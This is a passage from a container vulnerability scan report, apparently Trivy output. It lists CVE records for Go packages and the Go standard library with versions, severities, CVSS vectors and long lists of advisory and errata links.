│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-79 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ azure : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N 
│     │      │                           ╰ V3Score : 5.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42506 
│     │      │                  ├ [1]: https://go.dev/cl/781700 
│     │      │                  ├ [2]: https://go.dev/issue/79571 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42506 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5025 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42506 
│     │      ├ PublishedDate   : 2026-05-22T16:16:20.803Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [18] ╭ VulnerabilityID : CVE-2026-46600 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5942 
│     │      ├ PkgID           : golang.org/x/net@v0.37.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.37.0 
│     │      │                  ╰ UID : 5b14e468f8bbca73 
│     │      ├ InstalledVersion: v0.37.0 
│     │      ├ FixedVersion    : 0.56.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46600 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:7524fec1617fc8b3cd3a7b9d1dcd9f0666b8b5f8536ea2fdeb4493aa8d3c6be5 
│     │      ├ Title           : Parsing an invalid SVCB or HTTPS RR can panic when the size of a param ... 
│     │      ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size of a parameter
│     │      │                   value overflows the message buffer. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ CweIDs           ─ [0]: CWE-125 
│     │      ├ References       ╭ [0]: https://go.dev/cl/786345 
│     │      │                  ├ [1]: https://go.dev/issue/79795 
│     │      │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
│     │      ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
│     │      ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│     ├ [19] ╭ VulnerabilityID : CVE-2026-39824 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5024 
│     │      ├ PkgID           : golang.org/x/sys@v0.31.0 
│     │      ├ PkgName         : golang.org/x/sys 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/sys@v0.31.0 
│     │      │                  ╰ UID : 9877182d70cd79f1 
│     │      ├ InstalledVersion: v0.31.0 
│     │      ├ FixedVersion    : 0.44.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39824 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:484e1417c4a02da225187187857b90e7b7efc9059dbde55f9a5afd39d49968b4 
│     │      ├ Title           : Invoking integer overflow in NewNTUnicodeString in golang.org/x/sys/windows 
│     │      ├ Description     : NewNTUnicodeString does not check for string length overflow. When provided
│     │      │                   with a string that overflows the maximum size of a NTUnicodeString (a 16-bit
│     │      │                   number of bytes), it returns a truncated string rather than an error. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ CweIDs           ─ [0]: CWE-190 
│     │      ├ References       ╭ [0]: https://go.dev/cl/770080 
│     │      │                  ├ [1]: https://go.dev/issue/78916 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/6MMI8Lj-Atg 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-5024 
│     │      ├ PublishedDate   : 2026-05-22T20:16:33.057Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [20] ╭ VulnerabilityID : CVE-2026-56852 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5970 
│     │      ├ PkgID           : golang.org/x/text@v0.23.0 
│     │      ├ PkgName         : golang.org/x/text 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.23.0 
│     │      │                  ╰ UID : 11b54728311e29b0 
│     │      ├ InstalledVersion: v0.23.0 
│     │      ├ FixedVersion    : 0.39.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:a4b4bc569b3b70141cc87fbc2e127dd3f4b03e93728297d27c12353eadad9801 
│     │      ├ Title           : A norm.Iter can enter an infinite loop when handling input containing  ... 
│     │      ├ Description     : A norm.Iter can enter an infinite loop when handling input containing invalid
│     │      │                   UTF-8 bytes. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ CweIDs           ─ [0]: CWE-835 
│     │      ├ References       ╭ [0]: https://go.dev/cl/794100 
│     │      │                  ├ [1]: https://go.dev/issue/80142 
│     │      │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
│     │      ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
│     │      ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│     ├ [21] ╭ VulnerabilityID : CVE-2026-25679 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4601 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.8, 1.26.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25679 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:a67920d57e58593d7a2db7f1debcf69718591bcc3ef6db9310fef5737b91a243 
│     │      ├ Title           : net/url: Incorrect parsing of IPv6 host literals in net/url 
│     │      ├ Description     : url.Parse insufficiently validated the host/authority component and accepted
│     │      │                   some invalid URLs. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-425 
│     │      │                  ╰ [1]: CWE-1286 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 2 
│     │      │                  ├ azure      : 3 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ photon     : 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0]  : https://access.redhat.com/errata/RHSA-2026:10065 
│     │      │                  ├ [1]  : https://access.redhat.com/errata/RHSA-2026:10125 
│     │      │                  ├ [2]  : https://access.redhat.com/errata/RHSA-2026:10133 
│     │      │                  ├ [3]  : https://access.redhat.com/errata/RHSA-2026:10140 
│     │      │                  ├ [4]  : https://access.redhat.com/errata/RHSA-2026:10141 
│     │      │                  ├ [5]  : https://access.redhat.com/errata/RHSA-2026:10158 
│     │      │                  ├ [6]  : https://access.redhat.com/errata/RHSA-2026:10169 
│     │      │                  ├ [7]  : https://access.redhat.com/errata/RHSA-2026:10175 
│     │      │                  ├ [8]  : https://access.redhat.com/errata/RHSA-2026:10184 
│     │      │                  ├ [9]  : https://access.redhat.com/errata/RHSA-2026:10225 
│     │      │                  ├ [10] : https://access.redhat.com/errata/RHSA-2026:10250 
│     │      │                  ├ [11] : https://access.redhat.com/errata/RHSA-2026:10701 
│     │      │                  ├ [12] : https://access.redhat.com/errata/RHSA-2026:10712 
│     │      │                  ├ [13] : https://access.redhat.com/errata/RHSA-2026:10929 
│     │      │                  ├ [14] : https://access.redhat.com/errata/RHSA-2026:11217 
│     │      │                  ├ [15] : https://access.redhat.com/errata/RHSA-2026:11375 
│     │      │                  ├ [16] : https://access.redhat.com/errata/RHSA-2026:11412 
│     │      │                  ├ [17] : https://access.redhat.com/errata/RHSA-2026:11413 
│     │      │                  ├ [18] : https://access.redhat.com/errata/RHSA-2026:11686 
│     │      │                  ├ [19] : https://access.redhat.com/errata/RHSA-2026:11688 
│     │      │                  ├ [20] : https://access.redhat.com/errata/RHSA-2026:11747 
│     │      │                  ├ [21] : https://access.redhat.com/errata/RHSA-2026:11749 
│     │      │                  ├ [22] : https://access.redhat.com/errata/RHSA-2026:11768 
│     │      │                  ├ [23] : https://access.redhat.com/errata/RHSA-2026:11800 
│     │      │                  ├ [24] : https://access.redhat.com/errata/RHSA-2026:11856 
│     │      │                  ├ [25] : https://access.redhat.com/errata/RHSA-2026:11916 
│     │      │                  ├ [26] : https://access.redhat.com/errata/RHSA-2026:11996 
│     │      │                  ├ [27] : https://access.redhat.com/errata/RHSA-2026:12028 
│     │      │                  ├ [28] : https://access.redhat.com/errata/RHSA-2026:12029 
│     │      │                  ├ [29] : https://access.redhat.com/errata/RHSA-2026:12030 
│     │      │                  ├ [30] : https://access.redhat.com/errata/RHSA-2026:12031 
│     │      │                  ├ [31] : https://access.redhat.com/errata/RHSA-2026:12032 
│     │      │                  ├ [32] : https://access.redhat.com/errata/RHSA-2026:12033 
│     │      │                  ├ [33] : https://access.redhat.com/errata/RHSA-2026:12282 
│     │      │                  ├ [34] : https://access.redhat.com/errata/RHSA-2026:13508 
│     │      │                  ├ [35] : https://access.redhat.com/errata/RHSA-2026:13512 
│     │      │                  ├ [36] : https://access.redhat.com/errata/RHSA-2026:13545 
│     │      │                  ├ [37] : https://access.redhat.com/errata/RHSA-2026:13642 
│     │      │                  ├ [38] : https://access.redhat.com/errata/RHSA-2026:13643 
│     │      │                  ├ [39] : https://access.redhat.com/errata/RHSA-2026:13671 
│     │      │                  ├ [40] : https://access.redhat.com/errata/RHSA-2026:13791 
│     │      │                  ├ [41] : https://access.redhat.com/errata/RHSA-2026:13829 
│     │      │                  ├ [42] : https://access.redhat.com/errata/RHSA-2026:14020 
│     │      │                  ├ [43] : https://access.redhat.com/errata/RHSA-2026:14100 
│     │      │                  ├ [44] : https://access.redhat.com/errata/RHSA-2026:14774 
│     │      │                  ├ [45] : https://access.redhat.com/errata/RHSA-2026:14868 
│     │      │                  ├ [46] : https://access.redhat.com/errata/RHSA-2026:14879 
│     │      │                  ├ [47] : https://access.redhat.com/errata/RHSA-2026:15091 
│     │      │                  ├ [48] : https://access.redhat.com/errata/RHSA-2026:16102 
│     │      │                  ├ [49] : https://access.redhat.com/errata/RHSA-2026:16696 
│     │      │                  ├ [50] : https://access.redhat.com/errata/RHSA-2026:16874 
│     │      │                  ├ [51] : https://access.redhat.com/errata/RHSA-2026:16875 
│     │      │                  ├ [52] : https://access.redhat.com/errata/RHSA-2026:17040 
│     │      │                  ├ [53] : https://access.redhat.com/errata/RHSA-2026:17084 
│     │      │                  ├ [54] : https://access.redhat.com/errata/RHSA-2026:17287 
│     │      │                  ├ [55] : https://access.redhat.com/errata/RHSA-2026:17598 
│     │      │                  ├ [56] : https://access.redhat.com/errata/RHSA-2026:19017 
│     │      │                  ├ [57] : https://access.redhat.com/errata/RHSA-2026:19022 
│     │      │                  ├ [58] : https://access.redhat.com/errata/RHSA-2026:19026 
│     │      │                  ├ [59] : https://access.redhat.com/errata/RHSA-2026:19027 
│     │      │                  ├ [60] : https://access.redhat.com/errata/RHSA-2026:19031 
│     │      │                  ├ [61] : https://access.redhat.com/errata/RHSA-2026:19032 
│     │      │                  ├ [62] : https://access.redhat.com/errata/RHSA-2026:19049 
│     │      │                  ├ [63] : https://access.redhat.com/errata/RHSA-2026:19055 
│     │      │                  ├ [64] : https://access.redhat.com/errata/RHSA-2026:19126 
│     │      │                  ├ [65] : https://access.redhat.com/errata/RHSA-2026:19128 
│     │      │                  ├ [66] : https://access.redhat.com/errata/RHSA-2026:19132 
│     │      │                  ├ [67] : https://access.redhat.com/errata/RHSA-2026:19133 
│     │      │                  ├ [68] : https://access.redhat.com/errata/RHSA-2026:19135 
│     │      │                  ├ [69] : https://access.redhat.com/errata/RHSA-2026:19181 
│     │      │                  ├ [70] : https://access.redhat.com/errata/RHSA-2026:19184 
│     │      │                  ├ [71] : https://access.redhat.com/errata/RHSA-2026:19185 
│     │      │                  ├ [72] : https://access.redhat.com/errata/RHSA-2026:19207 
│     │      │                  ├ [73] : https://access.redhat.com/errata/RHSA-2026:19350 
│     │      │                  ├ [74] : https://access.redhat.com/errata/RHSA-2026:19353 
│     │      │                  ├ [75] : https://access.redhat.com/errata/RHSA-2026:19375 
│     │      │                  ├ [76] : https://access.redhat.com/errata/RHSA-2026:19475 
│     │      │                  ├ [77] : https://access.redhat.com/errata/RHSA-2026:19634 
│     │      │                  ├ [78] : https://access.redhat.com/errata/RHSA-2026:19719 
│     │      │                  ├ [79] : https://access.redhat.com/errata/RHSA-2026:19720 
│     │      │                  ├ [80] : https://access.redhat.com/errata/RHSA-2026:19721 
│     │      │                  ├ [81] : https://access.redhat.com/errata/RHSA-2026:19750 
│     │      │                  ├ [82] : https://access.redhat.com/errata/RHSA-2026:20041 
│     │      │                  ├ [83] : https://access.redhat.com/errata/RHSA-2026:20088 
│     │      │                  ├ [84] : https://access.redhat.com/errata/RHSA-2026:20581 
│     │      │                  ├ [85] : https://access.redhat.com/errata/RHSA-2026:20582 
│     │      │                  ├ [86] : https://access.redhat.com/errata/RHSA-2026:20584 
│     │      │                  ├ [87] : https://access.redhat.com/errata/RHSA-2026:20889 
│     │      │                  ├ [88] : https://access.redhat.com/errata/RHSA-2026:21017 
│     │      │                  ├ [89] : https://access.redhat.com/errata/RHSA-2026:21655 
│     │      │                  ├ [90] : https://access.redhat.com/errata/RHSA-2026:21657 
│     │      │                  ├ [91] : https://access.redhat.com/errata/RHSA-2026:21691 
│     │      │                  ├ [92] : https://access.redhat.com/errata/RHSA-2026:21696 
│     │      │                  ├ [93] : https://access.redhat.com/errata/RHSA-2026:21769 
│     │      │                  ├ [94] : https://access.redhat.com/errata/RHSA-2026:22347 
│     │      │                  ├ [95] : https://access.redhat.com/errata/RHSA-2026:22423 
│     │      │                  ├ [96] : https://access.redhat.com/errata/RHSA-2026:22450 
│     │      │                  ├ [97] : https://access.redhat.com/errata/RHSA-2026:22627 
│     │      │                  ├ [98] : https://access.redhat.com/errata/RHSA-2026:22714 
│     │      │                  ├ [99] : https://access.redhat.com/errata/RHSA-2026:22733 
│     │      │                  ├ [100]: https://access.redhat.com/errata/RHSA-2026:22862 
│     │      │                  ├ [101]: https://access.redhat.com/errata/RHSA-2026:22937 
│     │      │                  ├ [102]: https://access.redhat.com/errata/RHSA-2026:23228 
│     │      │                  ├ [103]: https://access.redhat.com/errata/RHSA-2026:23345 
│     │      │                  ├ [104]: https://access.redhat.com/errata/RHSA-2026:24386 
│     │      │                  ├ [105]: https://access.redhat.com/errata/RHSA-2026:24853 
│     │      │                  ├ [106]: https://access.redhat.com/errata/RHSA-2026:25043 
│     │      │                  ├ [107]: https://access.redhat.com/errata/RHSA-2026:25127 
│     │      │                  ├ [108]: https://access.redhat.com/errata/RHSA-2026:25180 
│     │      │                  ├ [109]: https://access.redhat.com/errata/RHSA-2026:25248 
│     │      │                  ├ [110]: https://access.redhat.com/errata/RHSA-2026:25250 
│     │      │                  ├ [111]: https://access.redhat.com/errata/RHSA-2026:25251 
│     │      │                  ├ [112]: https://access.redhat.com/errata/RHSA-2026:25252 
│     │      │                  ├ [113]: https://access.redhat.com/errata/RHSA-2026:25253 
│     │      │                  ├ [114]: https://access.redhat.com/errata/RHSA-2026:26445 
│     │      │                  ├ [115]: https://access.redhat.com/errata/RHSA-2026:26527 
│     │      │                  ├ [116]: https://access.redhat.com/errata/RHSA-2026:26541 
│     │      │                  ├ [117]: https://access.redhat.com/errata/RHSA-2026:26568 
│     │      │                  ├ [118]: https://access.redhat.com/errata/RHSA-2026:26585 
│     │      │                  ├ [119]: https://access.redhat.com/errata/RHSA-2026:26636 
│     │      │                  ├ [120]: https://access.redhat.com/errata/RHSA-2026:27076 
│     │      │                  ├ [121]: https://access.redhat.com/errata/RHSA-2026:28047 
│     │      │                  ├ [122]: https://access.redhat.com/errata/RHSA-2026:28441 
│     │      │                  ├ [123]: https://access.redhat.com/errata/RHSA-2026:28886 
│     │      │                  ├ [124]: https://access.redhat.com/errata/RHSA-2026:28893 
│     │      │                  ├ [125]: https://access.redhat.com/errata/RHSA-2026:28961 
│     │      │                  ├ [126]: https://access.redhat.com/errata/RHSA-2026:29035 
│     │      │                  ├ [127]: https://access.redhat.com/errata/RHSA-2026:29195 
│     │      │                  ├ [128]: https://access.redhat.com/errata/RHSA-2026:29455 
│     │      │                  ├ [129]: https://access.redhat.com/errata/RHSA-2026:29702 
│     │      │                  ├ [130]: https://access.redhat.com/errata/RHSA-2026:29703 
│     │      │                  ├ [131]: https://access.redhat.com/errata/RHSA-2026:29854 
│     │      │                  ├ [132]: https://access.redhat.com/errata/RHSA-2026:33722 
│     │      │                  ├ [133]: https://access.redhat.com/errata/RHSA-2026:34097 
│     │      │                  ├ [134]: https://access.redhat.com/errata/RHSA-2026:34365 
│     │      │                  ├ [135]: https://access.redhat.com/errata/RHSA-2026:36317 
│     │      │                  ├ [136]: https://access.redhat.com/errata/RHSA-2026:36319 
│     │      │                  ├ [137]: https://access.redhat.com/errata/RHSA-2026:36651 
│     │      │                  ├ [138]: https://access.redhat.com/errata/RHSA-2026:36796 
│     │      │                  ├ [139]: https://access.redhat.com/errata/RHSA-2026:39810 
│     │      │                  ├ [140]: https://access.redhat.com/errata/RHSA-2026:40118 
│     │      │                  ├ [141]: https://access.redhat.com/errata/RHSA-2026:40945 
│     │      │                  ├ [142]: https://access.redhat.com/errata/RHSA-2026:41019 
│     │      │                  ├ [143]: https://access.redhat.com/errata/RHSA-2026:41928 
│     │      │                  ├ [144]: https://access.redhat.com/errata/RHSA-2026:42150 
│     │      │                  ├ [145]: https://access.redhat.com/errata/RHSA-2026:42151 
│     │      │                  ├ [146]: https://access.redhat.com/errata/RHSA-2026:5110 
│     │      │                  ├ [147]: https://access.redhat.com/errata/RHSA-2026:5549 
│     │      │                  ├ [148]: https://access.redhat.com/errata/RHSA-2026:5941 
│     │      │                  ├ [149]: https://access.redhat.com/errata/RHSA-2026:5942 
│     │      │                  ├ [150]: https://access.redhat.com/errata/RHSA-2026:5943 
│     │      │                  ├ [151]: https://access.redhat.com/errata/RHSA-2026:5944 
│     │      │                  ├ [152]: https://access.redhat.com/errata/RHSA-2026:6341 
│     │      │                  ├ [153]: https://access.redhat.com/errata/RHSA-2026:6344 
│     │      │                  ├ [154]: https://access.redhat.com/errata/RHSA-2026:6382 
│     │      │                  ├ [155]: https://access.redhat.com/errata/RHSA-2026:6383 
│     │      │                  ├ [156]: https://access.redhat.com/errata/RHSA-2026:6388 
│     │      │                  ├ [157]: https://access.redhat.com/errata/RHSA-2026:6564 
│     │      │                  ├ [158]: https://access.redhat.com/errata/RHSA-2026:6720 
│     │      │                  ├ [159]: https://access.redhat.com/errata/RHSA-2026:6802 
│     │      │                  ├ [160]: https://access.redhat.com/errata/RHSA-2026:6949 
│     │      │                  ├ [161]: https://access.redhat.com/errata/RHSA-2026:7005 
│     │      │                  ├ [162]: https://access.redhat.com/errata/RHSA-2026:7009 
│     │      │                  ├ [163]: https://access.redhat.com/errata/RHSA-2026:7011 
│     │      │                  ├ [164]: https://access.redhat.com/errata/RHSA-2026:7259 
│     │      │                  ├ [165]: https://access.redhat.com/errata/RHSA-2026:7291 
│     │      │                  ├ [166]: https://access.redhat.com/errata/RHSA-2026:7315 
│     │      │                  ├ [167]: https://access.redhat.com/errata/RHSA-2026:7328 
│     │      │                  ├ [168]: https://access.redhat.com/errata/RHSA-2026:7385 
│     │      │                  ├ [169]: https://access.redhat.com/errata/RHSA-2026:7665 
│     │      │                  ├ [170]: https://access.redhat.com/errata/RHSA-2026:7669 
│     │      │                  ├ [171]: https://access.redhat.com/errata/RHSA-2026:7674 
│     │      │                  ├ [172]: https://access.redhat.com/errata/RHSA-2026:7833 
│     │      │                  ├ [173]: https://access.redhat.com/errata/RHSA-2026:7834 
│     │      │                  ├ [174]: https://access.redhat.com/errata/RHSA-2026:7876 
│     │      │                  ├ [175]: https://access.redhat.com/errata/RHSA-2026:7877 
│     │      │                  ├ [176]: https://access.redhat.com/errata/RHSA-2026:7878 
│     │      │                  ├ [177]: https://access.redhat.com/errata/RHSA-2026:7879 
│     │      │                  ├ [178]: https://access.redhat.com/errata/RHSA-2026:7883 
│     │      │                  ├ [179]: https://access.redhat.com/errata/RHSA-2026:7992 
│     │      │                  ├ [180]: https://access.redhat.com/errata/RHSA-2026:8151 
│     │      │                  ├ [181]: https://access.redhat.com/errata/RHSA-2026:8167 
│     │      │                  ├ [182]: https://access.redhat.com/errata/RHSA-2026:8314 
│     │      │                  ├ [183]: https://access.redhat.com/errata/RHSA-2026:8322 
│     │      │                  ├ [184]: https://access.redhat.com/errata/RHSA-2026:8324 
│     │      │                  ├ [185]: https://access.redhat.com/errata/RHSA-2026:8337 
│     │      │                  ├ [186]: https://access.redhat.com/errata/RHSA-2026:8338 
│     │      │                  ├ [187]: https://access.redhat.com/errata/RHSA-2026:8433 
│     │      │                  ├ [188]: https://access.redhat.com/errata/RHSA-2026:8434 
│     │      │                  ├ [189]: https://access.redhat.com/errata/RHSA-2026:8456 
│     │      │                  ├ [190]: https://access.redhat.com/errata/RHSA-2026:8483 
│     │      │                  ├ [191]: https://access.redhat.com/errata/RHSA-2026:8484 
│     │      │                  ├ [192]: https://access.redhat.com/errata/RHSA-2026:8490 
│     │      │                  ├ [193]: https://access.redhat.com/errata/RHSA-2026:8491 
│     │      │                  ├ [194]: https://access.redhat.com/errata/RHSA-2026:8493 
│     │      │                  ├ [195]: https://access.redhat.com/errata/RHSA-2026:8840 
│     │      │                  ├ [196]: https://access.redhat.com/errata/RHSA-2026:8841 
│     │      │                  ├ [197]: https://access.redhat.com/errata/RHSA-2026:8842 
│     │      │                  ├ [198]: https://access.redhat.com/errata/RHSA-2026:8845 
│     │      │                  ├ [199]: https://access.redhat.com/errata/RHSA-2026:8847 
│     │      │                  ├ [200]: https://access.redhat.com/errata/RHSA-2026:8848 
│     │      │                  ├ [201]: https://access.redhat.com/errata/RHSA-2026:8849 
│     │      │                  ├ [202]: https://access.redhat.com/errata/RHSA-2026:8851 
│     │      │                  ├ [203]: https://access.redhat.com/errata/RHSA-2026:8852 
│     │      │                  ├ [204]: https://access.redhat.com/errata/RHSA-2026:8853 
│     │      │                  ├ [205]: https://access.redhat.com/errata/RHSA-2026:8855 
│     │      │                  ├ [206]: https://access.redhat.com/errata/RHSA-2026:8856 
│     │      │                  ├ [207]: https://access.redhat.com/errata/RHSA-2026:8860 
│     │      │                  ├ [208]: https://access.redhat.com/errata/RHSA-2026:8877 
│     │      │                  ├ [209]: https://access.redhat.com/errata/RHSA-2026:8878 
│     │      │                  ├ [210]: https://access.redhat.com/errata/RHSA-2026:8879 
│     │      │                  ├ [211]: https://access.redhat.com/errata/RHSA-2026:8881 
│     │      │                  ├ [212]: https://access.redhat.com/errata/RHSA-2026:8882 
│     │      │                  ├ [213]: https://access.redhat.com/errata/RHSA-2026:8930 
│     │      │                  ├ [214]: https://access.redhat.com/errata/RHSA-2026:8931 
│     │      │                  ├ [215]: https://access.redhat.com/errata/RHSA-2026:8949 
│     │      │                  ├ [216]: https://access.redhat.com/errata/RHSA-2026:9043 
│     │      │                  ├ [217]: https://access.redhat.com/errata/RHSA-2026:9044 
│     │      │                  ├ [218]: https://access.redhat.com/errata/RHSA-2026:9052 
│     │      │                  ├ [219]: https://access.redhat.com/errata/RHSA-2026:9090 
│     │      │                  ├ [220]: https://access.redhat.com/errata/RHSA-2026:9093 
│     │      │                  ├ [221]: https://access.redhat.com/errata/RHSA-2026:9094 
│     │      │                  ├ [222]: https://access.redhat.com/errata/RHSA-2026:9097 
│     │      │                  ├ [223]: https://access.redhat.com/errata/RHSA-2026:9098 
│     │      │                  ├ [224]: https://access.redhat.com/errata/RHSA-2026:9108 
│     │      │                  ├ [225]: https://access.redhat.com/errata/RHSA-2026:9109 
│     │      │                  ├ [226]: https://access.redhat.com/errata/RHSA-2026:9385 
│     │      │                  ├ [227]: https://access.redhat.com/errata/RHSA-2026:9434 
│     │      │                  ├ [228]: https://access.redhat.com/errata/RHSA-2026:9435 
│     │      │                  ├ [229]: https://access.redhat.com/errata/RHSA-2026:9436 
│     │      │                  ├ [230]: https://access.redhat.com/errata/RHSA-2026:9439 
│     │      │                  ├ [231]: https://access.redhat.com/errata/RHSA-2026:9440 
│     │      │                  ├ [232]: https://access.redhat.com/errata/RHSA-2026:9448 
│     │      │                  ├ [233]: https://access.redhat.com/errata/RHSA-2026:9453 
│     │      │                  ├ [234]: https://access.redhat.com/errata/RHSA-2026:9461 
│     │      │                  ├ [235]: https://access.redhat.com/errata/RHSA-2026:9695 
│     │      │                  ├ [236]: https://access.redhat.com/errata/RHSA-2026:9742 
│     │      │                  ├ [237]: https://access.redhat.com/errata/RHSA-2026:9872 
│     │      │                  ├ [238]: https://access.redhat.com/security/cve/CVE-2026-25679 
│     │      │                  ├ [239]: https://bugzilla.redhat.com/2445356 
│     │      │                  ├ [240]: https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
│     │      │                  ├ [241]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25679 
│     │      │                  ├ [242]: https://errata.almalinux.org/9/ALSA-2026-9044.html 
│     │      │                  ├ [243]: https://errata.rockylinux.org/RLSA-2026:8456 
│     │      │                  ├ [244]: https://go.dev/cl/752180 
│     │      │                  ├ [245]: https://go.dev/issue/77578 
│     │      │                  ├ [246]: https://groups.google.com/g/golang-announce/c/EdhZqrQ98hk 
│     │      │                  ├ [247]: https://linux.oracle.com/cve/CVE-2026-25679.html 
│     │      │                  ├ [248]: https://linux.oracle.com/errata/ELSA-2026-9044.html 
│     │      │                  ├ [249]: https://nvd.nist.gov/vuln/detail/CVE-2026-25679 
│     │      │                  ├ [250]: https://pkg.go.dev/vuln/GO-2026-4601 
│     │      │                  ├ [251]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-2567
│     │      │                  │        9.json 
│     │      │                  ╰ [252]: https://www.cve.org/CVERecord?id=CVE-2026-25679 
│     │      ├ PublishedDate   : 2026-03-06T22:16:00.72Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:03.607Z 
│     ├ [22] ╭ VulnerabilityID : CVE-2026-27145 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5037 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.11, 1.26.4 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27145 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:da516aafd3f56fa35927cb88b7cebf7833b33d2b3658195bd4a1e2afb2f356e5 
